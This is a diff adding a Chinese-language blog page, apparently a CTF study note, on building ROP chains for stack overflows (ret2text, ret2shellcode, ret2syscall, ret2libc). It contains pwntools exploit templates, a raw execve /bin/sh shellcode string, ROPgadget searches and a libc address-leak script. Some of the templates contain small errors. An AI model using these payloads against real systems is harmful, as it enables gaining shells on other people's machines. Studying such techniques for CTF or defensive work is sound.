@@ -1,0 +1,265 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PWN的基本ROP链构造 - Autumnal</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址
+可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过gdb调试观察EIP寄存,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Autumnal" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Autumnal</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PWN的基本ROP链构造</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PWN的基本ROP链构造</h1>
+        <div class="stuff">
+            <span>一月 19, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="查找对应溢出"><a href="#查找对应溢出" class="headerlink" title="查找对应溢出"></a>查找对应溢出</h2><p>一般的溢出内容是<code>EIP</code>，因为<code>EIP</code>寄存器存储着我们<code>CPU</code>要读取指令的地址</p>
+<p>可以通过 <code>cyclic 数字</code>这个指令来获取判断溢出点的一个长度为输入的一个字符串，再通过<code>gdb</code>调试观察EIP寄存器处的 4 位字符，通过指令<code>cyclic -l 对应EIP的4位字符</code>，得到需要填充的溢出字符长度。</p>
+<h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>NX：防止栈上执行 (需要利用到 bss 段)</p>
+<p>Canary：检测是否发生栈溢出 </p>
+<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>通过计算溢出点的地址到对应返回的栈顶（ebp）的距离来进行溢出，同时要加上对应 ret 所占的 4 个字节。</p>
+<p><strong>对应 exp 构造模式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = 对应 /bin/sh/ 地址 </span><br><span class="line">payload = &#x27;a&#x27;*[溢出点到栈顶距离] + &#x27;A&#x27;*4 + p32/p64(shellcode)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h2><p>程序中没有出现 /bin/sh/ 地址需要自己构造，构造方式有两种：</p>
+<ul>
+<li><p>23字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p>44字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>一般实现溢出方式类似于 ret2text ，不同的是需要使用 <code>vmmap</code>检查对应的权限，同时也需要观察<code>bss</code><strong>（检查溢出点是否定义在 bss 段上）</strong></p>
+<p><strong>对应 exp 构造模式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bss = bss对应的地址</span><br><span class="line">shellcode = 构造一个shell</span><br><span class="line">payload = shellcode.ljust(&#x27;a&#x27;,溢出长度) + p32/p64(bss)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ret2syscall"><a href="#Ret2syscall" class="headerlink" title="Ret2syscall"></a>Ret2syscall</h2><p>程序中同样没有出现 /bin/sh/ 地址需要自己构造，原理为把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用（知识点<code>Linux</code>下系统调用）。</p>
+<p>学习链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/234228.html">ret2syscall原理详解与实例分析 </a></p>
+<p><strong>Syscall 调用规范</strong> <code>execve(“/bin/sh”, 0,0)</code></p>
+<p>它对应的汇编代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax# 系统调用号载入， execve为0xb</span><br><span class="line">pop ebx# 第一个参数， /bin/sh的string</span><br><span class="line">pop ecx# 第二个参数，0</span><br><span class="line">pop edx# 第三个参数，0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>寻找对应可以利用的 <code>ret(gadgets)</code>可以使用 <code>ropgadgets</code> 这个工具</p>
+<p>对应寻找步骤：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary 对应文件  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span>  //search eax  </span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">------------------------------------------------------------------------------------------------------------------</span><br><span class="line">$ ROPgadget --binary 对应文件  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span>  //search ebx\edx\ecx</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="variable">$ROPgadget</span> --binary 对应文件  --string <span class="string">&#x27;/bin/sh&#x27;</span>   //search <span class="string">&#x27;bin/sh&#x27;</span></span><br><span class="line">   Strings information</span><br><span class="line">   ============================================================</span><br><span class="line">   0x080be408 : /bin/sh</span><br><span class="line"> ----------------------------------------------------------------------------------------------------------------- </span><br><span class="line"><span class="variable">$ROPgadget</span> --binary 对应文件  --only <span class="string">&#x27;int&#x27;</span>       // search int 0x80         </span><br><span class="line">   Gadgets information</span><br><span class="line">   ============================================================</span><br><span class="line">   0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>
+
+<p><strong>对应 exp 构造模式：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_eax_ret = 可利用的 eax 的地址</span><br><span class="line">pop_edx_ecx_ebx_ret = 可利用的 ebx、edx、ecx地址</span><br><span class="line">int_0x80 = <span class="built_in">int</span> <span class="number">0x80</span> 的地址</span><br><span class="line">binsh = <span class="string">&#x27;bin/sh&#x27;</span> 的地址</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * 溢出长度, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h2><p><code>ret2libc</code> 即控制函数的执行 <code>libc (Linux下C库)</code> 中的函数，通常是返回至某个函数的 <code>PLT</code> 处或者函数的具体位置 ( 即函数对应的 got 表项的内容 )。一般情况下，我们会选择执行 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></p>
+<h3 id="含有-system-和-bin-sh"><a href="#含有-system-和-bin-sh" class="headerlink" title="含有 system 和 /bin/sh"></a>含有 system 和 /bin/sh</h3><p><strong>一般函数中含有 <code>/bin/sh</code> 、<code>system</code> 函数时构造对应的 exp 构建模式为：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binsh_addr = /<span class="built_in">bin</span>/sh/ 的地址</span><br><span class="line">system_plt = system 函数的地址</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * 溢出长度, system_plt,<span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>,binsh_addr])</span><br></pre></td></tr></table></figure>
+
+<p>需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
+<h3 id="不含有-bin-sh"><a href="#不含有-bin-sh" class="headerlink" title="不含有 /bin/sh"></a>不含有 /bin/sh</h3><p>如果函数中不含有 <code>/bin/sh</code> 时，我们需要在<code>bss</code>段上自己构建一个<code>/bin/sh</code></p>
+<p><strong>此时 exp 构造模式为：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system_plt = system 函数地址</span><br><span class="line">gets_addr = 溢出点函数地址</span><br><span class="line">buf_addr = bss 段上变量地址</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,system_plt,buf_addr,buf_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>对应的栈分布为：</p>
+<ul>
+<li>gets地址</li>
+<li>system地址（也是gets的返回地址）</li>
+<li>buf2（是gets的参数）</li>
+<li>buf2（是system的参数）</li>
+</ul>
+</blockquote>
+<p>或者：</p>
+<p>寻找一个 pop：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span>| grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>之后的 exp 构造模式：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system_plt = system 函数地址</span><br><span class="line">pop_ebx = ret ebx 的地址</span><br><span class="line">gets_addr = 溢出点函数地址</span><br><span class="line">buf_addr = bss 段上变量地址</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * 溢出长度,gets_addr,pop_ebx,system_plt,<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>,buf_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对应的栈分布为：</p>
+<ul>
+<li>gets地址</li>
+<li>pop ebx ；ret地址</li>
+<li>buf2（gets的参数）</li>
+<li>system地址</li>
+<li>system的返回地址（’AAAA’）</li>
+<li>buf2（system的参数）</li>
+</ul>
+</blockquote>
+<p>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system。</p>
+<h3 id="不含有-System-和-bin-sh"><a href="#不含有-System-和-bin-sh" class="headerlink" title="不含有 System 和 /bin/sh"></a>不含有 System 和 /bin/sh</h3><p>两个都没有给出的话需要自己寻找对应版本的 <code>libc</code></p>
+<p><strong>泄露函数地址：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * 溢出长度 + p32(puts_plt) + p32(main) +p32(libc_start_main_go)</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;&#x27;)</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])     </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr:&quot;</span> + <span class="built_in">hex</span>(libc_start_main_addr))</span><br></pre></td></tr></table></figure>
+
+<p><strong>对应构造 exp 模式为：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_addr = 找到对应 libc 版本后 system 的地址</span><br><span class="line">binsh_addr = 找到对饮 libc版本后 /<span class="built_in">bin</span>/sh 的地址</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * 溢出长度(需要用 cyclic 重新测试), system_addr, <span class="number">0xdeadbeef</span>, binsh_addr]) <span class="comment"># 0xdeadbeef 为 system 地址返回，可以随意设置</span></span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>一共需要两次 exp的编写，便可以完成对没有<code>/bin/sh</code>与<code>system</code>的<code>ret2libc</code>题目</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci='01ed89abee289d37f2f8'
+        data-cs='51741e819059e2ea7ab6c6f3d0fa0ac631d1d975'
+        data-r='equinox-shame.github.io'
+        data-o='Equinox-shame'
+        data-a='Equinox-shame'
+        data-d='false'
+    >查看评论</div>
+
+
+        
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+
+</html>
